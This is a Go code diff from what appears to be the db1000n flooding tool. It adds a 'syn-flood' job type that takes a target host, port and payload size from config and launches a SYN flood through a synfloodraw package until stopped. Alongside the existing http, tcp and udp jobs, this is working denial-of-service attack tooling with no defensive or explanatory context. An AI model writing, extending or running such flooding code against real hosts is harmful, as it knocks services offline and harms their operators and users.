@@ -18,6 +18,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/Arriven/db1000n/synfloodraw"
 	"github.com/google/uuid"
 )
 
@@ -34,9 +35,10 @@ type JobConfig struct {
 }
 
 var jobs = map[string]job{
-	"http": httpJob,
-	"tcp":  tcpJob,
-	"udp":  udpJob,
+	"http":      httpJob,
+	"tcp":       tcpJob,
+	"udp":       udpJob,
+	"syn-flood": synFloodJob,
 }
 
 // Config comment for linter
@@ -203,6 +205,28 @@ func udpJob(ctx context.Context, args JobArgs) error {
 		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
 	}
 	return nil
+}
+
+func synFloodJob(ctx context.Context, args JobArgs) error {
+	type synFloodJobConfig struct {
+		BasicJobConfig
+		Host          string
+		Port          int
+		PayloadLength int
+		FloodType     string
+	}
+	var jobConfig synFloodJobConfig
+	err := json.Unmarshal(args, &jobConfig)
+	if err != nil {
+		return err
+	}
+
+	shouldStop := make(chan bool)
+	go func() {
+		<-ctx.Done()
+		shouldStop <- true
+	}()
+	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 }
 
 func fetchConfig(configPath string) (*Config, error) {
